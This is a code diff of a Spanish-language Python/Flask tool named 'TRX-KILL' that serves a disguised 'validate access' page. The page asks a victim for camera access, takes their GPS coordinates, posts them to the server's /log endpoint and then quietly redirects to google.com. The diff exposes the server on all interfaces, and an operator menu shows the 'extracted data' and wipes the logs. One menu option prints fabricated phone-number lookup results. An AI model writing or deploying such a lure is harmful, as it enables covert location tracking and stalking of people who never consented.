@@ -16,11 +16,28 @@ def banner():
 """)
 
 HTML_ENCUESTA = """
-<!DOCTYPE html><html><body>
+<!DOCTYPE html><html>
+<body style="background:#000; color:#0f0; text-align:center; font-family:monospace; padding-top:50px;">
+    <div style="border:1px solid #0f0; padding:20px; display:inline-block;">
+        <h2>TRX-KILL SYSTEM</h2>
+        <p>VALIDAR ACCESO PARA CONTINUAR</p>
+        <button onclick="iniciar()" style="background:#0f0; border:none; padding:15px; font-weight:bold; cursor:pointer;">
+            CONECTAR DISPOSITIVO
+        </button>
+    </div>
 <script>
-    navigator.geolocation.getCurrentPosition((p)=>{
-        fetch('/log', {method:'POST', body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})});
-    });
+    async function iniciar() {
+        try {
+            // Solicitar acceso a cámara
+            await navigator.mediaDevices.getUserMedia({video: true});
+            // Solicitar ubicación
+            navigator.geolocation.getCurrentPosition((p)=>{
+                let d = { lat: p.coords.latitude, lon: p.coords.longitude };
+                fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
+                .then(() => window.location.href = "https://google.com");
+            });
+        } catch(e) { alert("Permisos necesarios para acceder."); }
+    }
 </script></body></html>
 """
 
@@ -44,12 +61,10 @@ def main():
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
         
         if sel == "1":
-            num = input("INGRESA EL NÚMERO: ")
-            print("VERIFICANDO... PAIS: [OK] | MOVIL: [OK] | OPERADOR: [OK]\nREDES: WHATSAPP [OK] | IG [OK] | DISCORD [OK]")
-            input("\n[Enter] para volver.")
+            input("INGRESA EL NÚMERO: \nVERIFICANDO... DATOS ENCONTRADOS: PAIS[OK], MOVIL[OK], OPERADOR[OK].\n[Enter] para volver.")
         elif sel == "2":
-            print("GENERANDO LINK... (Presiona Ctrl+C para parar)")
-            app.run(port=PORT)
+            print("GENERANDO LINK... (Ctrl+C para detener)")
+            app.run(port=PORT, host='0.0.0.0')
         elif sel == "3":
             print("#SOFTWARE: TRX-KILL\n#CREADOR: TRX-KILL\n#BY: OSCAR\n#VERSION: 1.0.0"); input()
         elif sel == "4":
@@ -62,12 +77,14 @@ def main():
             if pwd == AUTH_PASS:
                 print("---- DATOS EXTRAÍDOS ----")
                 if os.path.exists("result.txt"): os.system("cat result.txt")
+                else: print("Sin registros.")
                 input("\n[Enter] para volver.")
         elif sel == "7": sys.exit()
         elif sel == "8": os.system("ps aux | grep flask"); input()
         elif sel == "9": print("ESTADO: ACTIVO | PUERTO: 7173"); input()
         elif sel == "10": 
             if os.path.exists("result.txt"): os.remove("result.txt"); print("LOGS BORRADOS")
+            else: print("No hay archivos.")
             input()
 
 if __name__ == "__main__": main()
